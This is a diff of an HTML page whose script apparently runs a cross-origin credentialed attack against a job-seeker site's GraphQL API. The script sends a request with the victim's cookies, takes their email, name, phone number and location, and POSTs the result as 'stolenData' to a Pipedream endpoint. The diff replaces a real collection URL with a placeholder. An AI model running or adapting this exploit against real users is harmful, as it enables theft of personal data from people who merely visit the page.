@@ -1,4 +1,3 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -15,134 +14,42 @@
       credentials: "include",  // Sends cookies with the request
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        query: `query ResumeSection($includeAdminNames: Boolean = false) {
+        query: `query {
           currentUser {
             account {
-              id
-              ... on PassportAccount {
-                emailAddress
-                isConfirmed
-                accountId
-                __typename
-              }
+              emailAddress
               __typename
             }
             __typename
           }
           jobSeekerProfile {
             profile {
-              ...profileContactInfo
-              resume {
-                ...resumeContactInfo
-                ...resumeSectionFields
-                __typename
-              }
-              ...fileInformation
-              fraudMetadata {
-                state
+              defaultInfo {
+                contactInformation {
+                  firstName
+                  lastName
+                  phoneNumber
+                  location {
+                    formattedLocation
+                    city
+                    country
+                    __typename
+                  }
+                  __typename
+                }
                 __typename
               }
               __typename
             }
             __typename
           }
-        }
-
-        fragment profileContactInfo on JobSeekerProfile {
-          accountKey
-          defaultInfo {
-            contactInformation {
-              firstName
-              lastName
-              location {
-                address
-                city
-                admin1
-                admin1Name @include(if: $includeAdminNames)
-                admin3Name @include(if: $includeAdminNames)
-                admin4Name @include(if: $includeAdminNames)
-                postalCode
-                country
-                unknownLocation
-                formattedLocation
-                latitude
-                longitude
-                __typename
-              }
-              phoneNumber
-              __typename
-            }
-            __typename
-          }
-          __typename
-        }
-
-        fragment resumeContactInfo on JobSeekerProfileResume {
-          id
-          locale
-          firstName
-          lastName
-          firstNameFurigana
-          lastNameFurigana
-          phoneNumber
-          showPhoneNumber
-          headline
-          location {
-            address
-            address2
-            city
-            admin1
-            admin1Name @include(if: $includeAdminNames)
-            admin3Name @include(if: $includeAdminNames)
-            admin4Name @include(if: $includeAdminNames)
-            postalCode
-            country
-            formattedLocation
-            unknownLocation
-            latitude
-            longitude
-            geocodePrecision
-            __typename
-          }
-          resumeType
-          wordCount
-          employmentEligibilities {
-            employmentEligibility
-            id
-            __typename
-          }
-          __typename
-        }
-
-        fragment resumeSectionFields on JobSeekerProfileResume {
-          id
-          state
-          resumeType
-          dateModified
-          wordCount
-          __typename
-        }
-
-        fragment fileInformation on JobSeekerProfile {
-          fileInformation {
-            id
-            clientApp
-            extension
-            fileName
-            fileType
-            mediaType
-            tags
-            uploadTimestamp
-            __typename
-          }
-          __typename
         }`
       })
     })
     .then(response => response.json())
     .then(data => {
       // Send the stolen data to Pipedream
-      fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net/", {  // Replace with your Pipedream URL
+      fetch("https://your-pipedream-url.pipedream.com", {  // Replace with your Pipedream URL
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ stolenData: data })
